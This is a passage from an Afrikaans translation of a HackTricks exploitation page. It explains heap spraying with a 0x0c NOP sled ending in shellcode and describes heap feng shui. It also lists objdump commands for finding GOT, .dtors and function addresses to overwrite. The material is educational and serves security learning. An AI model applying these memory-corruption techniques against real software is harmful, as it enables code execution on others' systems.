Basies bestaan dit uit die reservasie van soveel moontlik geheue vir heaps en die vul van hierdie met 'n matras van nops wat met 'n shellcode eindig. Boonop word 0x0c as matras gebruik. Dit sal probeer om na die adres 0x0c0c0c0c te spring, en so as daar enige adres oorgeskrywe word waarnatoe daar gebel gaan word met hierdie matras, sal dit daarheen spring. Basies is die taktiek om soveel as moontlik te reserveer om te sien of 'n wyser oorgeskrywe word en na 0x0c0c0c0c te spring in die verwagting dat daar nops is.

**Heap Feng Shui**

Dit bestaan uit die reservasie en vrystelling van geheue sodat daar stukke tussen vrye stukke oorbly. Die buffer wat oorloop sal in een van die eiers gele√´ wees.

**objdump -d uitvoerbare** ‚Äî> Disas funksies\
**objdump -d ./PROGRAMA | grep FUNKSIE** ‚Äî> Kry funksie adres\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Om te sien dat dit werklik ons shellcode is en die OpCodes te kry\
**objdump -t ./exec | grep varBss** ‚Äî> Simbool tabel, om adresse van veranderlikes en funksies te kry\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Om adresse van biblioteek funksies (GOT) te kry\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Kry die adres van puts om in die GOT oorgeskrywe te word\
**objdump -D ./exec** ‚Äî> Disas ALLES tot die ingange van die plt\
**objdump -p -/exec**\
**Info funksies strncmp ‚Äî>** Info van die funksie in gdb

## Interessante kursusse

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Verwysings**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
